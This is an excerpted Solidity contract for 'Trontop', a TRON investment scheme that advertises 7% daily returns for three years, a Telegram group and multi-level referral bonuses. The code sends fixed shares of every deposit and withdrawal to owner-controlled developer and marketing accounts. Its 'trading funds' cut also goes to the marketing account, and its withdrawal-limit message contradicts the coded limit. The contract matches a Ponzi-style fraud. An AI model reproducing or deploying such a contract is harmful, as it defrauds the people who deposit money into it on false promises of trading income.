//SourceUnit: Trontop.sol

/**TRONTOP TRADING
 - Earn 7% DAILY - 3 YEARS PERIOD
 - Join telegram group - t.me/TrontopClub
 - Total of 30% Referal Rewards - 3 Levels
/**
    ADDED FEATURE = 10% Auto Reinvest
    ...
    Professional Trading Team has a quota of 10-15% income every 24 hours and it will be added to the contract balance
...
contract Trontop is Ownable {

    using SafeMath for uint256;

    uint256 public constant DEVELOPER_RATE = 8;         
    uint256 public constant MARKETING_RATE = 10;
    uint256 public constant SUPPORT_RATE = 2; 
    uint256 public constant TRADING_FUNDS = 30;             
    uint256 public constant AUTOCOMPOUND = 10;  // reinvest 10%
    uint256 private max_withdraw = 35000000000; // 35k trx max withdraw
    uint256 private max_withdraw_ref = 100000000000; 
    ...
    address payable public tradingFunds;
    address payable private supportAccount_;

     constructor() public {
        owner = msg.sender;
        investment_days = 1095; // 3 years period
        investment_perc = 7665; // 7% daily


        referral_bonuses.push(250); // 25% First Level
    ...
    function setSupportAccount(address payable _newSupportAccount) public onlyOwner {
        require(_newSupportAccount != address(0));
        supportAccount_ = _newSupportAccount;

    }

    function getSupportAccount() public view onlyOwner returns (address) {
        return supportAccount_;

    }
    function setTradingAccount(address payable _newTradingAccount) public onlyOwner {
        require(_newTradingAccount != address(0));
        tradingFunds = _newTradingAccount;

    }
    function getTradingtAccount() public view onlyOwner returns (address) {
        return tradingFunds;
    ...
    function deposit(address _referral) external payable {
         require(msg.value >= 2e7, "Zero amount");
          require(msg.value >= 20000000, "Minimum deposit: 20 TRX");
        ...
        uint256 tradingPercentage = (msg.value.mul(TRADING_FUNDS)).div(100);
        marketingAccount_.transfer(tradingPercentage);
        
        uint256 supportPercentage = (msg.value.mul(SUPPORT_RATE)).div(100);
        marketingAccount_.transfer(supportPercentage);     
    ...
    function withdraw() payable external {
        ...
        require(withdraws <= max_withdraw,"Maximum withdrawals is 100,000 trx");
        ...
        uint256 _10Percent = amount.mul(AUTOCOMPOUND).div(100);

        uint256 amountLess10 = amount.sub(_10Percent);



        autoreinvest(_10Percent);



        player.dividends = 0;

        player.total_withdrawn += amountLess10;

        total_withdrawn += amountLess10;





        msg.sender.transfer(amountLess10);

        

        uint256 developerPercentage = (amountLess10.mul(DEVELOPER_RATE)).div(100);

        developerAccount_.transfer(developerPercentage);

        uint256 marketingPercentage = (amountLess10.mul(MARKETING_RATE)).div(100);
